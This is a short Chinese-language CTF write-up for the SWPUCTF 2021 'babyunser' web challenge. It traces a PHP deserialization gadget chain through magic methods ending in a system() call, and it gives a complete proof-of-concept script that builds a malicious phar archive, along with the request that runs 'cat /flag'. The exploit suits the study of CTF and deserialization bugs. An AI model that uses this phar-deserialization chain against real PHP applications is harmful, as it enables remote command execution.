---
title: "Web 15 [SWPUCTF 2021 新生赛]babyunser"
published: 2026-02-20
category: CTF
---

这道题主要是学习师傅的WP，对于反序列化还完全不懂。

**核心**：调用 `xx` 类的 `__call` 方法，通过此方法构造恶意函数进而执行传入的命令。

## 链子分析

- **起点**：`aa` 类，`__destruct` 方法中用了 `strtolower(name)`，将 `name` 属性设置为 `zz` 类对象，触发 `zz::__toString`
- `zz::__toString` 中：`$this->{_POST['method']}($_POST['var'])` → POST传 `method=write&var=content`
- 进入 `zz::write` → `$lt = $this->filename->content`，将 `filename` 设置为 `ff` 类对象，访问私有属性触发 `ff::__get('content')`
- `ff::__get` 中：`$this->content->{$this->func}($_POST['cmd'])` → `content` 设置为 `xx` 类对象，调用不存在的 `system` 方法，触发 `xx::__call`
- `xx::__call('system', 'cat /flag')` → 最终执行 `system('cat /flag')`

## 最终 POC

```php
<?php
class aa{
    public $name;
}
class ff{
    private $content;
    public $func="system";
    public function __construct(){
        $this->content=new xx();
    }
}
class zz{
    public $filename;
    public $content;
}
class xx{
    public $name;
    public $arg;
}
$a=new aa();
$a->name=new zz();
$a->name->filename=new ff();

$phar = new phar('exp.phar');
$phar -> startBuffering();
$phar -> setStub("<?php __HALT_COMPILER();?>");
$phar -> setMetadata($a);
$phar -> addFromString("test.txt","test");
$phar -> stopBuffering();
?>
```

**请求**：`file=phar://upload/你的文件.txt&method=write&var=content&cmd=cat /flag`
